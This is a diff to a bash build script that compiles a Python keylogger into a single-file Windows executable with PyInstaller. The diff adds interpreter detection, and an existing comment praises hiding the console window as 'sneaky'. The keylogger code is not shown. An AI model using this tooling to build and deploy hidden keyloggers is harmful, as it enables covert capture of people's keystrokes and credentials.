@@ -1,4 +1,4 @@
-#!/bin/bash
+﻿#!/bin/bash
 set -e
 
 echo "--- Building Keylogger Executable Locally ---"
@@ -6,6 +6,15 @@ echo "--- Building Keylogger Executable Locally ---"
 MAIN_SCRIPT="./script.py"
 DIST_DIR="./dist"
 EXECUTABLE_NAME="Keylogger"
+
+if command -v python >/dev/null 2>&1; then
+    PYTHON_BIN="python"
+elif command -v py >/dev/null 2>&1; then
+    PYTHON_BIN="py -3"
+else
+    echo "Error: No Python interpreter found in PATH."
+    exit 1
+fi
 
 # clean up previous builds
 if [ -d "$DIST_DIR" ]; then
@@ -26,7 +35,7 @@ fi
 # --windowed or --noconsole: prevents the console window from appearing (sneaky sneaky)
 # --name "${EXECUTABLE_NAME}": explicitly sets the output executable name
 echo "Running PyInstaller on ${MAIN_SCRIPT} with name ${EXECUTABLE_NAME}.exe..."
-pyinstaller --onefile --windowed --name "${EXECUTABLE_NAME}" "$MAIN_SCRIPT"
+$PYTHON_BIN -m PyInstaller --onefile --windowed --name "${EXECUTABLE_NAME}" "$MAIN_SCRIPT"
 
 # verify
 if [ ! -f "${DIST_DIR}/${EXECUTABLE_NAME}.exe" ]; then
